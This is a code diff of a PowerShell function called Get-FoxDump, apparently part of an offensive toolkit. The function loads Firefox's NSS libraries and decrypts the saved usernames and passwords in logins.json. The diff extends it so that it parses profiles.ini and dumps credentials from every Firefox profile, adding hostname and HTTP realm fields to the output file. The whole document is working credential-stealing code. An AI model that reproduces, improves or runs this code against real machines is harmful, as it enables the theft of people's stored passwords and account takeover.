@@ -785,36 +785,15 @@ Function Get-FoxDump
 
 
         $nss3dll = "$mozillapath\nss3.dll"
-
         $mozgluedll = "$mozillapath\mozglue.dll"
-        $msvcr120dll = "$mozillapath\msvcr120.dll"
-        $msvcp120dll = "$mozillapath\msvcp120.dll"
 
-        if(Test-Path $msvcr120dll)
-        {
-
-            $msvcr120dllHandle = $Kernel32::LoadLibrary($msvcr120dll)
-            $LastError= [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-            Write-Verbose "Last Error when loading mozglue.dll: $LastError"
-
-
-        }
-
-        if(Test-Path $msvcp120dll)
-        {
-
-            $msvcp120dllHandle = $kernel32::LoadLibrary($msvcp120dll)
-            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-            Write-Verbose "Last Error loading mscvp120.dll: $LastError"
-
-        }
 
         if(Test-Path $mozgluedll)
         {
 
             $mozgluedllHandle = $Kernel32::LoadLibrary($mozgluedll)
             $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-            Write-Verbose "Last error loading msvcr120.dll: $LastError"
+            Write-Verbose "Last error loading mozglue.dll: $LastError"
 
         }
 
@@ -877,7 +856,7 @@ Function Get-FoxDump
     }
 
     $NSSInitAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSS_Init")
-    $NSSInitDelegates = Get-DelegateType @([string]) ([long])
+    $NSSInitDelegates = Get-DelegateType @([string]) ([int])
     $NSS_Init = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSInitAddr, $NSSInitDelegates)
 
     $NSSShutdownAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSS_Shutdown")
@@ -888,15 +867,71 @@ Function Get-FoxDump
     $PK11SDR_DecryptDelegates = Get-DelegateType @([Type]$TSECItem.MakeByRefType(),[Type]$TSECItem.MakeByRefType(), [int]) ([int])
     $PK11SDR_Decrypt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PK11SDR_DecryptAddr, $PK11SDR_DecryptDelegates)
 
-    $profilePath = "$($env:APPDATA)\Mozilla\Firefox\Profiles\*.default"
-
-    $defaultProfile = $(Get-ChildItem $profilePath).FullName
-    $NSSInitResult = $NSS_Init.Invoke($defaultProfile)
-    Write-Verbose "[+]NSS_Init result: $NSSInitResult"
-
-
-    if(Test-Path $defaultProfile)
+    $FirefoxRoot = "$($env:APPDATA)\Mozilla\Firefox"
+    $ProfilesIniPath = Join-Path $FirefoxRoot "profiles.ini"
+    $ProfilePaths = @()
+    if (Test-Path $ProfilesIniPath) 
     {
+        $ProfilesIniContent = Get-Content $ProfilesIniPath -Raw
+        # $ProfileSections = [regex]::Split($ProfilesIniContent, "(?m)(?=\[Profile)") | Where-Object { $_ -match "Path="}
+        $ProfileSections = $ProfilesIniContent -split "(?m)^(?=\[Profile)"
+        
+        foreach ($ProfileSection in $ProfileSections)
+        {
+            # Skip sections that don't have a Path field, like [General]
+            if ($ProfileSection -notmatch "Path=") { continue }
+            
+            $PathMatch = [regex]::Match($ProfileSection, "Path=(.+?)\r\n")
+            $RelativeMatch = [regex]::Match($ProfileSection, "IsRelative=(0|1)")
+            
+            if ($PathMatch.Success)
+            {
+                $RawPath = $PathMatch.Groups[1].Value
+                $IsRelative = $RelativeMatch.Groups[1].Value
+                Write-Verbose "Raw path: $RawPath. is relative? $IsRelative"
+                if ($IsRelative)
+                {
+                    $ProfilePath = Join-Path $FirefoxRoot $RawPath
+                }
+                else
+                {
+                    $ProfilePath = $RawPath
+                }
+                $ProfilePaths += $ProfilePath
+            }
+        }
+    }
+    else
+    {
+        Throw "Unable to load Mozilla profiles.ini"
+    }
+    
+    if ($OutFile)
+    {
+        "" | Out-File -Encoding ascii $OutFile
+    }    
+    
+    foreach ($profilePath in $ProfilePaths)
+    {        
+        if (Test-Path $profilePath)
+        {
+            try
+            {
+                if($OutFile)
+                {
+                    ("-" * 80) | Out-File -Encoding ascii $OutFile -Append
+                    "Profile: $profilePath" | Out-File -Encoding ascii $OutFile -Append   
+                }
+                else
+                {
+                    ("-" * 80) | Out-String
+                    "Profile: $profilePath" | Out-String
+                }
+                
+            
+                Write-Verbose "[+]Checking passwords for profile $profilePath"
+                $NSSInitResult = $NSS_Init.Invoke($profilePath)
+    Write-Verbose "[+]NSS_Init result: $NSSInitResult"
         #Web.extensions assembly is necessary for handling json files
         try
         {
@@ -908,12 +943,17 @@ Function Get-FoxDump
             break
         }
 
-
-        $jsonFile = Get-Content "$defaultProfile\logins.json"
+                $loginsJsonPath = Join-Path $profilePath "logins.json"
+                if (-Not (Test-Path $loginsJsonPath))
+                {
+                    Write-Warning "logins.json cannot be found"
+                    continue
+                }
+                $jsonFile = Get-Content $loginsJsonPath
         if(!($jsonFile))
         {
             Write-Warning "Login information cannot be found in logins.json"
-            break
+                    continue
         }
         $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer
         $obj = $ser.DeserializeObject($jsonFile)
@@ -928,10 +968,14 @@ Function Get-FoxDump
             Write-Verbose "[+]Decrypting login information..."
             $user = Decrypt-CipherText $($logins.GetValue($i)['encryptedUsername'])
             $pass = Decrypt-CipherText $($logins.GetValue($i)['encryptedPassword'])
+                    $hostname = $($logins.GetValue($i)['hostname'])
+                    $httpRealm = $($logins.GetValue($i)['httpRealm'])
             $formUrl = $($logins.GetValue($i)['formSubmitURL'])
             $FoxCreds = New-Object PSObject -Property @{
                 UserName = $user
                 Password = $pass
+                        Hostname = $hostname
+                        HttpRealm = $httpRealm
                 URL = $formUrl
             }
             $passwordlist += $FoxCreds
@@ -939,23 +983,41 @@ Function Get-FoxDump
         #Spit out the results to a file.... or not.
         if($OutFile)
         {
-            $passwordlist | Format-List URL, UserName, Password | Out-File -Encoding ascii $OutFile
+                    if($passwordlist.Length -gt 0)
+                    {
+                        $passwordlist | Format-List Hostname, HttpRealm, URL, UserName, Password | Out-File -Encoding ascii $OutFile -Append
         }
         else
         {
-            $passwordlist | Format-List URL, UserName, Password | Out-String
-        }
-
-        $kernel32::FreeLibrary($msvcp120dllHandle) | Out-Null
-        $Kernel32::FreeLibrary($msvcr120dllHandle) | Out-Null
-        $kernel32::FreeLibrary($mozgluedllHandle) | Out-Null
-        $kernel32::FreeLibrary($nssdllhandle) | Out-Null
-
+                        "No credentials found" | Out-File -Encoding ascii $OutFile -Append
+                    }                              
     }
     else
     {
-        Write-Warning "Unable to locate default profile"
+                    if($passwordlist.Length -gt 0)
+                    {
+                        $passwordlist | Format-List Hostname, HttpRealm, URL, UserName, Password | Out-String
+                    }
+                    else
+                    {
+                        "No credentials found" | Out-String
+                    }                    
+                }                           
+            }
+            finally
+            {            
+                $NSSShutdownResult = $NSS_Shutdown.Invoke()
+                Write-Verbose "[+]NSS_Shutdown result: $NSSShutdownResult"            
+            }
+        }
+        else
+        {
+            Write-Warning "Unable to locate profile $profilePath"
+    }
     }
 
+    $kernel32::FreeLibrary($mozgluedllHandle) | Out-Null
+    $kernel32::FreeLibrary($nssdllhandle) | Out-Null
 
 }
+
